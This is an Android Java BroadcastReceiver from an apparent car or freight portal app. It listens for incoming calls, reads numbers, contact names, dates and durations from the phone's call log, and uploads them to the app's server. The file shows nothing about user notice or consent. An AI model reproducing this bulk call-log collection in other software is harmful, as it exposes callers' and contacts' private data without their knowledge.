package com.car.portal.activity.reviecer;

import android.annotation.SuppressLint;
import android.app.Service;
import android.content.AsyncQueryHandler;
import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.SystemClock;
import android.telephony.TelephonyManager;
import android.util.Log;

import com.car.portal.entity.BaseEntity;
import com.car.portal.entity.CallLogBean;
import com.car.portal.entity.User;
import com.car.portal.http.MyCallBack;
import com.car.portal.service.UserService;
import com.car.portal.util.BaseUtil;
import com.car.portal.util.LogUtils;
import com.car.portal.util.SharedPreferenceUtil;
import com.car.portal.util.StringUtil;

import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
/*********************************************************************************************************************************************************
 * 内存溢出问题：初步判定为GoodsInfoFragment、MainActivity中的网络请求数据解析问题
 */

/***
 * 拦截来电的广播
 */
public class CallLogReciever extends BroadcastReceiver {

    private UserService service;
    private int uid;
    private Context context;
    public static final String[] projection = {android.provider.CallLog.Calls.DATE, // 日期
            android.provider.CallLog.Calls.NUMBER, // 号码
            android.provider.CallLog.Calls.TYPE, // 类型
            android.provider.CallLog.Calls.CACHED_NAME, // 名字
            android.provider.CallLog.Calls._ID, // id
            android.provider.CallLog.Calls.DURATION};

    private String hasLoadPhone;
    private boolean isUpload = false;
    private int readId = 0;
    private final Uri uri = android.provider.CallLog.Calls.CONTENT_URI;

    public CallLogReciever() {
        Log.e("CallLogReceiver", "++++++++++++++ create +++++++++++");
    }

    @Override
    public void onReceive(Context context, Intent intent) {
        this.context = context;
        initCallBack();
        service = new UserService(context);
        User user = service.getSavedUser();
        BaseUtil.writeFile("CallLog", "   进入电话监听start");
        uid = (user != null ? user.getUid() : 0);
        isUpData(context, intent);
    }

    public void isUpData(Context context, Intent intent) {
        this.context = context;
        // 如果是来电
        TelephonyManager telMgr = (TelephonyManager) context
                .getSystemService(Service.TELEPHONY_SERVICE);

        switch (telMgr.getCallState()) {
            case TelephonyManager.CALL_STATE_RINGING:// 响铃
                CallLogBean.ringCount++;
                CallLogBean.setmIsComming(true, 76);
                String phones = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER);
                if (CallLogBean.phonenumber == null || (phones != null && !CallLogBean
						.phonenumber.equals(phones)) || !"null".equals(phones)) {
                    CallLogBean.phonenumber = phones;
                } else if (StringUtil.isNullOrEmpty(phones)) {
                    //LogUtils.e("CallPhone", "未读取到有效电话号码，电话号码为 ： " + phones);
                    //BaseUtil.writeFile("CallPhone", "未读取到有效电话号码，电话号码为 ： " + phones);
                    return;
                } else {
                   // LogUtils.e("CallLogReciver", "未设置来电，来电号码：" + CallLogBean.phonenumber);
                   // BaseUtil.writeFile("CallLogReciver", "未设置来电，来电号码：" + CallLogBean.phonenumber);
                }
                if (CallLogBean.ringCount % 2 != 0 && CallLogBean.phonenumber != null &&
						!CallLogBean.phonenumber.equals(hasLoadPhone)) {
                   // LogUtils.e("CallLogReciver", "上传来电号码：" + CallLogBean.phonenumber);
                   // BaseUtil.writeFile("CallLogReciver", "上传来电号码:" + CallLogBean.phonenumber);
                    hasLoadPhone = CallLogBean.phonenumber;
//                    service.uploadPhone(CallLogBean.phonenumber, uid, loadPhoneBack);
                    queryDBDataMax();
                    CallLogBean.setCallCount(0);
                } else if (CallLogBean.ringCount % 2 == 0) {
                    //LogUtils.e("CallLogReciver", "重置来电次数，来电号码：" + CallLogBean.phonenumber);
                   // BaseUtil.writeFile("CallLogReciver", "重置来电次数，来电号码:" + CallLogBean.phonenumber);
                    CallLogBean.ringCount = 0;
                } /*else {
                    LogUtils.e("CallLogReciver", "来电次数:" + CallLogBean.ringCount + "\t来电号码：" +
							CallLogBean.phonenumber);
                    BaseUtil.writeFile("CallLogReciver", "来电次数:" + CallLogBean.ringCount +
							"\t来电号码：" + CallLogBean.phonenumber);
                }*/
                break;

            case TelephonyManager.CALL_STATE_OFFHOOK:// 接听
                CallLogBean.addCallCount();                    //callCount  + 1
                break;
            case TelephonyManager.CALL_STATE_IDLE:// 挂断
                CallLogBean.num++;
                /*Log.e("CallLogReciver", "挂断电话:" + CallLogBean.phonenumber + ",IsComing=" +
                        CallLogBean.ismIsComming());
                BaseUtil.writeFile("CallLogReciver", "挂断电话:" + CallLogBean.phonenumber + "," +
                        "IsComing=" + CallLogBean.ismIsComming());*/
                if (CallLogBean.ismIsComming()) {
                    queryCallrecord();
                    CallLogBean.setmIsComming(false, 117);
                }
                break;
        }
    }

    /**
     * 初始化查询的条件
     */
    public void queryCallrecord() {
        if (isUpload) {
            return;
        }
        isUpload = true;
        SystemClock.sleep(600);
        /*Log.e("CallLogReciver", "开始查询电话系统通话记录");
        BaseUtil.writeFile("CallLogReciver", "开始查询通话记录");*/
        int read_id = SharedPreferenceUtil.readData(context);
        MyAsyncQueryHandler asyncQuery = new MyAsyncQueryHandler(context.getContentResolver());
        if (read_id == 0) {
            String limit = android.provider.CallLog.Calls.DEFAULT_SORT_ORDER + " limit 1 offset 0";
            asyncQuery.startQuery(0, null, uri, projection, android.provider.CallLog.Calls.TYPE + " != 2", null, limit);
        } else {
            asyncQuery.startQuery(0, null, uri, projection, android.provider.CallLog.Calls.TYPE + " != 2 and "
            		+ android.provider.CallLog.Calls._ID + " > ?", new String[]{read_id + ""},
                    android.provider.CallLog.Calls.DEFAULT_SORT_ORDER);
        }
        isUpload = false;
    }

    /**
     * 查询手机通话记录
     */
    public class MyAsyncQueryHandler extends AsyncQueryHandler {

        public MyAsyncQueryHandler(ContentResolver cr) {
            super(cr);
        }

        @Override
        protected void onQueryComplete(int token, Object cookie, Cursor cursor) {
           /* LogUtils.e("CallLogReciver", "获取到的通话记录：" + (cursor == null ? 0 : cursor.getCount()));
            BaseUtil.writeFile("CallLogReciver", "获取到的通话记录：" + (cursor == null ? 0 : cursor
					.getCount()));*/

            if (cursor != null && cursor.getCount() > 0) {
                List<CallLogBean> callLogs = getCallLog(cursor);
                if (callLogs.size() <= 0) {
                    return;
                }
                readId = callLogs.get(0).getId();
                try {
                    SystemClock.sleep(1000);
                    if (SharedPreferenceUtil.readData(context) == 0) {
                        firstPhoneNumberUpload(callLogs);
                    } else {
                        otherPhoneNumberUpload(callLogs);
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                    BaseUtil.writeFile("LoadPhones", e);
                }
            }
        }

        @SuppressLint("SimpleDateFormat")
		public List<CallLogBean> getCallLog(Cursor cursor) {
            List<CallLogBean> callLogs = new ArrayList<CallLogBean>();
            try {
                while (cursor.moveToNext()) {
                    //LogUtils.e("callLog","-------------------------------------------------");
                    Date date = new Date(cursor.getLong(cursor.getColumnIndex(android.provider
							.CallLog.Calls.DATE)));
                    String number = cursor.getString(cursor.getColumnIndex(android.provider
							.CallLog.Calls.NUMBER));
                    int type = cursor.getInt(cursor.getColumnIndex(android.provider.CallLog.Calls
							.TYPE));
                    String cachedName = cursor.getString(cursor.getColumnIndex(android.provider
							.CallLog.Calls.CACHED_NAME));//
                    // 缓存的名称与电话号码，如果它的存在
                    int id = cursor.getInt(cursor.getColumnIndex(android.provider.CallLog.Calls
							._ID));
                    long time = cursor.getLong(cursor.getColumnIndex(android.provider.CallLog
							.Calls.DURATION));
                    CallLogBean callLogBean = new CallLogBean();
                    if (id <= SharedPreferenceUtil.readData(context) || time < 0) {
                        return null;
                    } else if (!StringUtil.isPhone(number) && !StringUtil.isFixedPhone(number)) {
                        return null;
                    }
                    if (number.startsWith("+") && number.length() > 3) {
                        number = number.substring(3).trim();
                    }
                    callLogBean.setId(id);
                    callLogBean.setNumber(number);
                    callLogBean.setName(cachedName);
                    if (type == 3)
                        callLogBean.setTime(0);
                    else
                        callLogBean.setTime(time);
                    if (null == cachedName || "".equals(cachedName)) {
                        callLogBean.setName(number);
                    }
                    callLogBean.setType(type);
                    SimpleDateFormat sfd = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
                    callLogBean.setDate(sfd.format(date));
                    callLogs.add(callLogBean);
                }
            } catch (Exception e) {
                e.printStackTrace();
                BaseUtil.writeFile("searchPhone", e);
            } finally {
                cursor.close();
            }
            return callLogs;
        }

        /**
         * 非第一次上传电话号码
         *
         * @param
         */
        private void otherPhoneNumberUpload(List<CallLogBean> callLogs) {
            //LogUtils.e("CallLogReciver", "        isCom" + CallLogBean.isComplete);
            if (CallLogBean.isComplete) {
                final CallLogBean b = callLogs.remove(0);
                if (CallLogBean.phoneId > 0) {
                    /*BaseUtil.writeFile("CallLogRec", "更新时间：phoneId=" + CallLogBean.phoneId);
                    LogUtils.e("CallLogRec", "更新时间：phoneId=" + CallLogBean.phoneId);*/
                    service.upLoadCallInfo(CallLogBean.phoneId, b.getId(), b.getTime(), updateTimeBack);
                }
                CallLogBean.setIsComplete(false);
            }
            if (callLogs.size() > 0 && !CallLogBean.hasLoading) {
                CallLogBean.hasLoading = true;
                /*BaseUtil.writeFile("CallLogRec", "上传历史记录");
                LogUtils.e("CallLogRec", "上传历史记录");*/
                service.uploadCallLog(callLogs, uid, uploadListBack);
            }
        }

        /**
         * 第一个号码上传
         *
         * @param
         */
        private void firstPhoneNumberUpload(List<CallLogBean> callLogs) {
            LogUtils.e("CallLogReciver", "        isCom" + CallLogBean.isComplete);
            if (CallLogBean.isComplete && CallLogBean.phoneId != 0) {
                /*LogUtils.e("CallLogReceiver", "更新来电时间");
                BaseUtil.writeFile("CallLogReceiver", "更新来电时间");*/
                service.upLoadCallInfo(CallLogBean.phoneId, callLogs.get(0).getId(), callLogs.get(0).getTime(),
                        updateTimeBack);
                CallLogBean.setIsComplete(false);
            } else {
                /*LogUtils.e("CallLogReceiver", "上传第一通电话");
                BaseUtil.writeFile("CallLogReceiver", "上传第一通电话");*/
                final List<CallLogBean> callLogBeans = new ArrayList<CallLogBean>();
                callLogBeans.add(callLogs.get(0));
                service.uploadCallLog(callLogBeans, uid, uploadListBack);
            }
        }
    }

    public void initCallBack() {
        if (uploadListBack == null) {
            uploadListBack = new MyCallBack<BaseEntity<String>>() {
                @Override
                public void onSuccess(BaseEntity<String> entity) {
                    if (entity.getResult() == 1) {
                        SharedPreferenceUtil.saveDate(readId, context);
                        CallLogBean.setmIsComming(false, 448);
                        /*LogUtils.e("CallLogRec", "历史电话长传成功：" + CallLogBean.ismIsComming());
                        BaseUtil.writeFile("CallLogRec", "历史电话长传成功：" + CallLogBean.ismIsComming());*/
                    }/* else {
                        LogUtils.e("CallLogRec", "历史电话长传成功：" + CallLogBean.ismIsComming());
                        BaseUtil.writeFile("CallLogRec", "历史电话长传成功：" + CallLogBean.ismIsComming());
                    }*/
                    CallLogBean.hasLoading = false;
                }

                @Override
                public void onError(Throwable throwable, boolean b) {
                    BaseUtil.writeFile("UserService", throwable);
                    throwable.printStackTrace();
                    CallLogBean.hasLoading = false;
                }
            };
        }
        if (updateTimeBack == null) {
            updateTimeBack = new MyCallBack<BaseEntity<String>>() {
                @Override
                public void onSuccess(BaseEntity<String> stringBaseEntity) {
                    if (stringBaseEntity.getResult() == 1) {
                        //LogUtils.e("UserService", "    上传时间OK");
                        SharedPreferenceUtil.saveDate(readId, context);
                        /*LogUtils.e("CallLogReciver", "来电时间更新成功:" + CallLogBean.phonenumber);
                        BaseUtil.writeFile("CallLogReciver", "来电时间更新成功:" + CallLogBean.phonenumber);*/
                    }/* else {
                        LogUtils.e("CallLogReceiver", "time onfail");
                        BaseUtil.writeFile("CallLogReceiver", "time onfail");
                    }*/
                    CallLogBean.phoneId = 0;
                }

                @Override
                public void onError(Throwable throwable, boolean b) {
                    //LogUtils.e("UserService", "    上传时间失败");
                    CallLogBean.phoneId = 0;
                    /*LogUtils.e("CallLogReceiver", "onerror:" + throwable);
                    BaseUtil.writeFile("CallLogReceiver", throwable);*/
                }
            };
        }
        if (loadPhoneBack == null) {
            loadPhoneBack = new MyCallBack<BaseEntity<Double>>() {
                @Override
                public void onSuccess(BaseEntity<Double> arg0) {
                    if (arg0 != null && arg0.getResult() == 1) {
                        CallLogBean.isComplete = true;
                        hasLoadPhone = null;
                        CallLogBean.phoneId = arg0.getData().intValue();
                        /*LogUtils.e("CallLogReceiver", "upload phone success:{phoneId:" + CallLogBean.phoneId + "}");
                        BaseUtil.writeFile("CallLogReceiver", "upload phone success:{phoneId:" + CallLogBean.phoneId + "}");*/
                    } else {
                        CallLogBean.isComplete = false;//上传没有成功
                        hasLoadPhone = null;
                       /* LogUtils.e("CallLogReceiver", "load phone fail");
                        BaseUtil.writeFile("CallLogReceiver", "load phone fail");*/
                    }
                }

                @Override
                public void onError(Throwable arg0, boolean b) {
                    CallLogBean.isComplete = false;//上传没有成功
                    hasLoadPhone = null;
                    /*LogUtils.e("CallLogReceiver", "load phone onerror");
                    BaseUtil.writeFile("CallLogReceiver", "load phone onerror");*/
                }
            };
        }
    }

    private MyCallBack<BaseEntity<String>> uploadListBack;
    private MyCallBack<BaseEntity<String>> updateTimeBack;
    private MyCallBack<BaseEntity<Double>> loadPhoneBack;

    @Override
    protected void finalize() throws Throwable {
        super.finalize();
        context = null;
        service = null;
    }

    /**
     * 查询最新一通来电,上传
     */
    public void queryDBDataMax(){
        /*ContentResolver resolver = context.getContentResolver();
        String limit = android.provider.CallLog.Calls.DEFAULT_SORT_ORDER + " limit 1 offset 0";
        Cursor cursor = null;
        int localId = 0;
        try {
             cursor = resolver.query(uri, projection, null, null, limit);
             cursor.moveToPosition(0);
             localId = cursor.getInt(cursor.getColumnIndex(android.provider.CallLog.Calls._ID));
            cursor.close();
        } catch (Exception e){
            e.printStackTrace();
            BaseUtil.writeFile("CallLogReceiver", e);
        }
        service.uploadPhone(CallLogBean.phonenumber, localId,  uid, loadPhoneBack);*/
    }
}
